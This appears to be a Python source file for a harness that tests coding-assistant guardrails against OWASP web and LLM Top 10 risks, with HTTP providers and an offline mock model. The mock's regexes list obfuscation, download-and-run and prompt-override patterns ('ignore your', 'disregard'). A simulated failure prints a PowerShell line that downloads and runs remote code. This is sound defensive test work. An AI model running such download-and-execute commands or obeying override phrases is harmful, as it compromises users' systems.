"""
Model providers.

A provider takes a system prompt (the guardrail) + a user prompt (the test
case) and returns the assistant's text response. The harness is model-agnostic
so the same dataset can be run against whatever model your org actually uses to
power its vibe-coding assistant.

Providers included:
  - AnthropicProvider          : api.anthropic.com /v1/messages
  - OpenAICompatibleProvider   : any /v1/chat/completions endpoint
                                 (OpenAI, Azure OpenAI, vLLM, Ollama, LM Studio,
                                  OpenRouter, Together, ...)
  - MockProvider               : offline, deterministic. Simulates a *correctly
                                 behaving* guardrailed model so you can validate
                                 the harness itself without spending tokens.

No third-party SDK is required: HTTP calls use the stdlib (urllib).
"""

from __future__ import annotations

import json
import os
import re
import ssl
import time
import urllib.request
import urllib.error
from dataclasses import dataclass


class ProviderError(RuntimeError):
    pass


@dataclass
class ModelResponse:
    text: str
    raw: dict
    latency_s: float


class BaseProvider:
    name = "base"

    def complete(self, system_prompt: str, user_prompt: str) -> ModelResponse:
        raise NotImplementedError


def build_ssl_context(ca_bundle: str | None = None, insecure: bool = False):
    """
    Build a TLS context for corporate gateways.

    Behind a TLS-intercepting proxy (e.g. the VW Group internal gateway), Python
    will not trust the private root CA and raises CERTIFICATE_VERIFY_FAILED.
    Resolution order:
      1. explicit ca_bundle path (recommended for production CI),
      2. SSL_CERT_FILE / REQUESTS_CA_BUNDLE env var,
      3. insecure=True -> verification OFF (TESTING ONLY; itself an A04 anti-pattern).
    """
    if insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx
    cafile = ca_bundle or os.getenv("SSL_CERT_FILE") or os.getenv("REQUESTS_CA_BUNDLE")
    if cafile:
        if not os.path.exists(cafile):
            raise ProviderError(f"CA bundle not found: {cafile}")
        return ssl.create_default_context(cafile=cafile)
    return ssl.create_default_context()


def _http_post(url: str, headers: dict, payload: dict, timeout: int = 120,
               context=None, retries: int = 2) -> dict:
    data = json.dumps(payload).encode("utf-8")
    last_err = None
    for attempt in range(retries + 1):
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=context) as resp:
                return json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace")
            # 4xx are deterministic; don't retry. 5xx/429 may be transient.
            if e.code not in (429,) and 400 <= e.code < 500:
                raise ProviderError(f"HTTP {e.code} from {url}: {body[:500]}") from e
            last_err = ProviderError(f"HTTP {e.code} from {url}: {body[:300]}")
        except (urllib.error.URLError, ssl.SSLError, TimeoutError) as e:
            reason = getattr(e, "reason", e)
            last_err = ProviderError(f"Network/TLS error to {url}: {reason}")
        if attempt < retries:
            time.sleep(1.5 * (attempt + 1))
    raise last_err


# --------------------------------------------------------------------------- #
# Anthropic
# --------------------------------------------------------------------------- #
class AnthropicProvider(BaseProvider):
    name = "anthropic"

    def __init__(self, model: str | None = None, api_key: str | None = None,
                 max_tokens: int = 1500, temperature: float = 0.0,
                 ca_bundle: str | None = None, insecure: bool = False,
                 timeout: int = 120, retries: int = 2):
        self.model = model or os.getenv("ANTHROPIC_MODEL", "claude-sonnet-4-6")
        self.api_key = api_key or os.getenv("ANTHROPIC_API_KEY")
        if not self.api_key:
            raise ProviderError("ANTHROPIC_API_KEY not set.")
        self.max_tokens = max_tokens
        self.temperature = temperature
        self.base_url = os.getenv("ANTHROPIC_BASE_URL", "https://api.anthropic.com")
        self.ctx = build_ssl_context(ca_bundle, insecure)
        self.timeout = timeout
        self.retries = retries

    def complete(self, system_prompt: str, user_prompt: str) -> ModelResponse:
        url = f"{self.base_url}/v1/messages"
        headers = {
            "x-api-key": self.api_key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json",
        }
        payload = {
            "model": self.model,
            "max_tokens": self.max_tokens,
            "temperature": self.temperature,
            "system": system_prompt,
            "messages": [{"role": "user", "content": user_prompt}],
        }
        t0 = time.time()
        data = _http_post(url, headers, payload, timeout=self.timeout,
                          context=self.ctx, retries=self.retries)
        latency = time.time() - t0
        parts = [b.get("text", "") for b in data.get("content", []) if b.get("type") == "text"]
        return ModelResponse(text="\n".join(parts).strip(), raw=data, latency_s=latency)


# --------------------------------------------------------------------------- #
# OpenAI-compatible (OpenAI, Azure, vLLM, Ollama, OpenRouter, Together, ...)
# --------------------------------------------------------------------------- #
class OpenAICompatibleProvider(BaseProvider):
    name = "openai"

    def __init__(self, model: str | None = None, api_key: str | None = None,
                 base_url: str | None = None, max_tokens: int = 1500,
                 temperature: float = 0.0, ca_bundle: str | None = None,
                 insecure: bool = False, timeout: int = 120, retries: int = 2):
        self.model = model or os.getenv("OPENAI_MODEL", "gpt-4o-mini")
        self.api_key = api_key or os.getenv("OPENAI_API_KEY", "not-needed")
        self.base_url = (base_url or os.getenv("OPENAI_BASE_URL",
                         "https://api.openai.com/v1")).rstrip("/")
        self.max_tokens = max_tokens
        self.temperature = temperature
        self.ctx = build_ssl_context(ca_bundle, insecure)
        self.timeout = timeout
        self.retries = retries

    def complete(self, system_prompt: str, user_prompt: str) -> ModelResponse:
        url = f"{self.base_url}/chat/completions"
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "content-type": "application/json",
        }
        payload = {
            "model": self.model,
            "max_tokens": self.max_tokens,
            "temperature": self.temperature,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt},
            ],
        }
        t0 = time.time()
        data = self._post_adaptive(url, headers, payload)
        latency = time.time() - t0
        text = data.get("choices", [{}])[0].get("message", {}).get("content", "") or ""
        return ModelResponse(text=text.strip(), raw=data, latency_s=latency)

    def _post_adaptive(self, url, headers, payload):
        """
        Newer OpenAI-style models (gpt-5 / o-series, as served by some gateways)
        reject `max_tokens` (want `max_completion_tokens`) and only allow the
        default `temperature`. Rather than hard-code a dialect, self-heal: on a
        400 that names an unsupported parameter, rename/drop it and retry.
        """
        for _ in range(5):
            try:
                return _http_post(url, headers, payload, timeout=self.timeout,
                                  context=self.ctx, retries=self.retries)
            except ProviderError as e:
                msg = str(e)
                if "HTTP 400" not in msg:
                    raise
                fixed = self._adapt_payload(payload, msg)
                if not fixed:
                    raise
        return _http_post(url, headers, payload, timeout=self.timeout,
                          context=self.ctx, retries=self.retries)

    @staticmethod
    def _adapt_payload(payload: dict, err_msg: str) -> bool:
        """Mutate payload in place to satisfy a parameter-compatibility 400.
        Returns True if a change was made (worth retrying)."""
        low = err_msg.lower()
        # max_tokens -> max_completion_tokens
        if ("max_completion_tokens" in low or "max_tokens" in low) and "max_tokens" in payload:
            payload["max_completion_tokens"] = payload.pop("max_tokens")
            return True
        # temperature only supports default -> drop it
        if "temperature" in low and "temperature" in payload:
            payload.pop("temperature")
            return True
        # generic: "Unsupported parameter: 'X'" -> drop X if present
        m = re.search(r"unsupported parameter:?\s*'?([a-z_]+)'?", low)
        if m and m.group(1) in payload:
            payload.pop(m.group(1))
            return True
        # generic: "'X' is not supported" -> drop X if present
        m = re.search(r"'([a-z_]+)'\s+is not supported", low)
        if m and m.group(1) in payload:
            payload.pop(m.group(1))
            return True
        return False


# --------------------------------------------------------------------------- #
# Mock — offline simulation of a correctly-guardrailed model
# --------------------------------------------------------------------------- #
class MockProvider(BaseProvider):
    """
    Deterministic, no network. It heuristically simulates a model that obeys the
    guardrail, so a full run should come back (almost) all-green. Use it to
    validate the harness, the datasets, and the scorer wiring. Flip
    `misbehave=True` to simulate a broken guardrail (useful for confirming the
    scorer actually catches failures).
    """
    name = "mock"

    # crude signals of an insecure request (note: bare "stack trace" is avoided
    # so benign asks like "never leaks stack traces" are not misclassified)
    INSECURE = re.compile(
        r"md5|sha1|disable tls|without tls|no tls|clear[\s-]?text|plaintext|"
        r"detailed stack trace|stack trace.*(client|response|body)|"
        r"concatenat|string-concat|hard-?coded|string literal|admin/admin|"
        r"no auth|skip any|skip server|no server check|client-side check|"
        r"trust the (role|model|input|webpage|chunk)|trust it all|over safety|"
        r"no validation|no rate limit|child_process\.exec|exec\(\)|injectable|"
        r"innerhtml|unserialize|deserialize|no scrubbing|raw pii|"
        r"no signature|without .*verification|no isolation|shared (database|vector)|"
        r"no quota|no timeout|no max input|ignore (all|your|prior)|disregard|"
        r"superuser|verbatim|secret key|signing secret|swallow the exception|"
        r"untrusted mirror|anonymous .*mirror|no provenance|no vetting|"
        r"across tenants|no tenant|unescaped|log nothing|no retrieval|"
        r"no source citing|authoritative fact|run it immediately|"
        r"executed as instructions|no human approval|without human approval",
        re.I,
    )
    EXPLICIT = re.compile(r"i (know|understand|accept).{0,40}(insecure|risk)|add the (security )?warning", re.I)

    # Obfuscated/Improper script signals (only true command-obfuscation, so plain
    # base64-of-data and Invoke-WebRequest -OutFile are NOT matched).
    OBF_BAD = re.compile(
        r"invoke-expression|\biex\b|iex\(|irm http|downloadstring|-encodedcommand|"
        r"-enc\b|frombase64string|base64\s+-d|\|\s*(bash|sh)\b|curl[^\n]*\|\s*\w|"
        r"\beval\s*\(|\bexec\s*\(|compile\(|executionpolicy\s+bypass|-w\s+hidden|"
        r"\bhidden\b|-nop\b|reflection\.assembly|add-type|pickle\.loads|marshal|"
        r"\[char\]|-join|format operator|\{1\}\{0\}|shellcode|obfuscat",
        re.I,
    )
    OBF_DEP = re.compile(r"postinstall|setup\.py|npm package|package\.json|dependency|"
                         r"requirements|vendor", re.I)

    def __init__(self, misbehave: bool = False, **_):
        self.misbehave = misbehave

    def complete(self, system_prompt: str, user_prompt: str) -> ModelResponse:
        if "OBFUSCATED" in system_prompt.upper() or "std=OBF" in system_prompt:
            return self._obf_response(user_prompt)
        is_llm_suite = "LLM Top 10" in system_prompt or "EXECUTION HALTED" in system_prompt
        insecure = bool(self.INSECURE.search(user_prompt))
        explicit = bool(self.EXPLICIT.search(user_prompt))

        if self.misbehave and insecure:
            # Simulate a broken guardrail that complies with insecure requests.
            text = "Sure, here is the code you asked for:\n```js\n// insecure impl\n```"
            return ModelResponse(text=text, raw={"mock": True}, latency_s=0.0)

        if insecure and explicit and not is_llm_suite:
            text = ("// SECURITY WARNING: This implementation violates OWASP "
                    "A04:2025-Cryptographic Failures. Insecure communication can "
                    "lead to data interception.\n```js\n// requested insecure impl\n```")
        elif insecure and is_llm_suite:
            cat = self._guess_llm_cat(user_prompt)
            text = f"EXECUTION HALTED: Violation of OWASP LLM Top 10 (2025) - {cat}"
        elif insecure:
            cat = self._guess_web_cat(user_prompt)
            text = (f"I cannot complete this request because it violates {cat}. "
                    f"Specific Risk: the requested implementation is insecure.")
        else:
            # benign -> secure code + compliance summary
            if is_llm_suite:
                text = ("Here is a secure implementation.\n```js\n// validated, "
                        "least-privilege impl\n```")
            else:
                text = ("Here is a secure implementation.\n```js\n// server-side, "
                        "parameterized, deny-by-default\n```\n\n"
                        "Security Compliance Summary: applied input validation, "
                        "parameterized queries, and deny-by-default access control.")
        return ModelResponse(text=text, raw={"mock": True}, latency_s=0.0)

    def _obf_response(self, user_prompt: str) -> ModelResponse:
        bad = bool(self.OBF_BAD.search(user_prompt))
        dep = bool(self.OBF_DEP.search(user_prompt))
        if self.misbehave and bad:
            text = ("Sure, here's the obfuscated script:\n```powershell\n"
                    "IEX (New-Object Net.WebClient).DownloadString('http://x')\n```")
        elif bad and dep:
            rule = self._guess_obf_rule(user_prompt)
            text = (f"[[GUARDRAIL: ALERT | std=OBF | rule={rule} | action=flagged]]\n"
                    f"SECURITY ALERT: Obfuscated/Improper Artifact Found - {rule}: "
                    f"obfuscated dependency artifact. Recommendation: use a vetted, "
                    f"maintained alternative and escalate to the security team.")
        elif bad:
            rule = self._guess_obf_rule(user_prompt)
            text = (f"[[GUARDRAIL: HALT | std=OBF | rule={rule} | action=refused]]\n"
                    f"EXECUTION HALTED: Obfuscated/Improper Script Detected - {rule}: "
                    f"obfuscated/dynamic execution. Specific Risk: this is a detection-"
                    f"evasion / malware-delivery pattern. Clean alternative available.")
        else:
            text = ("[[GUARDRAIL: PASS | std=OBF | rule=NONE | action=clean]]\n"
                    "Here is a clean, readable script.\n```powershell\n"
                    "# readable, no dynamic exec, no encoded payloads\n```\n"
                    "--- Clean-Script Compliance ---\n"
                    "No dynamic execution, encoded payloads, or download-and-run. "
                    "Identifiers are readable.\nDependencies: pinned & verified.")
        return ModelResponse(text=text, raw={"mock": True}, latency_s=0.0)

    @staticmethod
    def _guess_obf_rule(p: str) -> str:
        p = p.lower()
        table = [
            ("postinstall|setup\\.py|package\\.json|dependency|vendor", "OBF07"),
            ("downloadstring|\\| *bash|\\| *sh|curl|wget|irm http", "OBF03"),
            ("-encodedcommand|-enc\\b|frombase64string|base64 -d", "OBF02"),
            ("reflection\\.assembly|add-type|pickle\\.loads|marshal|shellcode", "OBF06"),
            ("executionpolicy|hidden|-nop", "OBF05"),
            ("\\[char\\]|-join|format operator|\\{1\\}\\{0\\}|obfuscat", "OBF04"),
            ("invoke-expression|iex|eval\\(|exec\\(|compile\\(", "OBF01"),
        ]
        for pat, code in table:
            if re.search(pat, p):
                return code
        return "OBF01"

    @staticmethod
    def _guess_web_cat(p: str) -> str:
        p = p.lower()
        table = [
            ("md5|tls|https|hash", "OWASP A04:2025-Cryptographic Failures"),
            ("concat|exec|injection|sql", "OWASP A05:2025-Injection"),
            ("admin/admin|rate limit|secret|credential", "OWASP A07:2025-Authentication Failures"),
            ("auth|access|idor|tenant|isadmin", "OWASP A01:2025-Broken Access Control"),
            ("stack trace|header|misconfig", "OWASP A02:2025-Security Misconfiguration"),
            ("mirror|dependency|supply", "OWASP A03:2025-Software Supply Chain Failures"),
            ("deserialize|signature|integrity|update", "OWASP A08:2025-Software or Data Integrity Failures"),
            ("log", "OWASP A09:2025-Security Logging and Alerting Failures"),
            ("exception|rollback|swallow", "OWASP A10:2025-Mishandling of Exceptional Conditions"),
            ("design|isolation", "OWASP A06:2025-Insecure Design"),
        ]
        for pat, cat in table:
            if re.search(pat, p):
                return cat
        return "OWASP A05:2025-Injection"

    @staticmethod
    def _guess_llm_cat(p: str) -> str:
        p = p.lower()
        table = [
            ("innerhtml|exec|sql|output", "Improper Output Handling (LLM05)"),
            ("system prompt|secret|api key|verbatim", "System Prompt Protection (LLM07)"),
            ("pii|disclosure|ssn", "Sensitive Information Disclosure (LLM02)"),
            ("vector|embedding", "Vector and Embedding Security (LLM08)"),
            ("rate limit|quota|timeout|unbounded", "Unbounded Consumption Management (LLM10)"),
            ("tool|agency|approval|superuser", "Excessive Agency (LLM06)"),
            ("poison|rag|fine-tun|ingest", "Data and Model Poisoning (LLM04)"),
            ("mirror|provenance|sbom|supply", "Supply Chain Integrity (LLM03)"),
            ("misinformation|hallucinat|cite|dosage", "Misinformation Mitigation (LLM09)"),
            ("inject|ignore|untrusted", "Input Validation & Prompt Injection (LLM01)"),
        ]
        for pat, cat in table:
            if re.search(pat, p):
                return cat
        return "Input Validation & Prompt Injection (LLM01)"


def build_provider(name: str, **kwargs) -> BaseProvider:
    name = (name or "mock").lower()
    net = ("model", "api_key", "max_tokens", "temperature",
           "ca_bundle", "insecure", "timeout", "retries")
    if name == "anthropic":
        return AnthropicProvider(**_filter(kwargs, net))
    if name in ("openai", "openai-compatible", "openai_compatible"):
        return OpenAICompatibleProvider(**_filter(kwargs, net + ("base_url",)))
    if name == "mock":
        return MockProvider(**_filter(kwargs, ("misbehave",)))
    raise ProviderError(f"Unknown provider '{name}'. Use anthropic | openai | mock.")


def _filter(d: dict, keys) -> dict:
    return {k: v for k, v in d.items() if k in keys and v is not None}
